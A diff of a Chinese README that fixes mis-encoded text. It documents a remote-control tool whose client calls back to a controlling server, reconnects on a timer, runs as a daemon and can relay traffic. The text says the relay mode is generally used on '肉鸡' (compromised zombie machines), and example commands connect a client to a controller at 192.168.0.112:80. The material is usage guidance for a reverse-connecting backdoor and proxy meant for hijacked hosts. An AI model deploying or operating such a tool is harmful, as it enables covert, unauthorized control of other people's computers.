@@ -1,25 +1,25 @@
-Ŀǰֻ֧�������еĽ���ģʽ
+目前只支持命令行的交互模式
 
-����ˣ�
+服务端：
 server
--host �󶨱���ip��Ĭ��0.0.0.0��
--port �������ض˿ڣ�Ĭ��1234��
+-host 绑定本地ip（默认0.0.0.0）
+-port 侦听本地端口（默认1234）
 
-������ӣ�./server -host 0.0.0.0 -port 80
+最简单例子：./server -host 0.0.0.0 -port 80
 
-�ͻ��ˣ�
+客户端：
 client
--host ����Զ��ip
--portԶ�˶˿�
--always ���öϿ��������ʱ�䣬��λ�루����-alwaysֻ����һ�Σ��Ӳ�������дֵĬ�ϼ��10�룩
--proxyd ��Ϊ�м��˴�����
-���磺./client -host 192.168.0.112 -port 80 -proxyd 0:8888 Ȼ��Ŀ�����ӱ���8888�˿ڣ��������ӿ��ƶˣ�һ���������ʽ�����⼦�ϣ�
---daemon���ػ����̷�ʽ������
+-host 连接远端ip
+-port远端端口
+-always 设置断开重连间隔时间，单位秒（不加-always只连接一次，加参数但不写值默认间隔10秒）
+-proxyd 作为中间人代理，
+例如：./client -host 192.168.0.112 -port 80 -proxyd 0:8888 让目标连接本机8888端口，本机连接控制端（192.168.0.112:80）。一般此启动方式用在肉鸡上。
+--daemon（守护进程方式启动）
 
-������ӣ�./client -host 192.168.0.112 -port 80
+最简单例子：./client -host 192.168.0.112 -port 80
 
-�������
-\!q ������������
-\!shutdown ����Ŀ�����
+本地命令：
+\!q 结束本次连接
+\!shutdown 结束目标进程
 
-Ŀǰֻ֧�ֵ��߳�
+目前只支持单线程
